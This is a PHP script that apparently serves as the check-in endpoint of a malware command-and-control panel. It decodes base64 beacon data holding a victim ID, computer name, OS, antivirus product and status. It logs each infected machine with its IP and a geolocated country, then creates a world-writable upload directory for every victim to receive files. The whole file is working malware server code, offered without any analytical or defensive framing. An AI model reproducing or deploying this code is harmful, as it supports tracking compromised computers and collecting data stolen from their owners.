<?php
include 'classes/Database.php';
include 'classes/Clients.php';

$client = new Clients;

$ipaddress = $_SERVER['REMOTE_ADDR'];
$country = getConteryCode($ipaddress);
$date = date("Y-m-d");
$data = isset($_GET['data']) ? explode("|BN|", base64_decode($_GET['data'])) : '';

$clientdata = [
'vicid'=>$data[0],
'ip'=>$ipaddress,
'cpname'=>$data[1],
'cont'=>$country,
'os'=>$data[2],
'insdate'=>$date,
'av'=>$data[3],
'stats'=>$data[4],
];

$client->newClient($clientdata);

new_dir($data[0]);

function getConteryCode($ipaddress) {
   $json = file_get_contents('http://www.geoplugin.net/json.gp?ip='.$ipaddress); 
   $data = json_decode($json);
   if ($data->geoplugin_countryCode == "") {
       return "X";
   } else {
       return strtolower($data->geoplugin_countryCode);
   }
}

function new_dir($victimID){
 try {
    mkdir("upload/$victimID");
    copy("upload/index.php", "upload/$victimID/index.php");
    copy("upload/.htaccess", "upload/$victimID/.htaccess");
    chmod("upload/$victimID", 0777);
  } catch (Exception $e) {
      return $e->getMessage();
  }

}
?>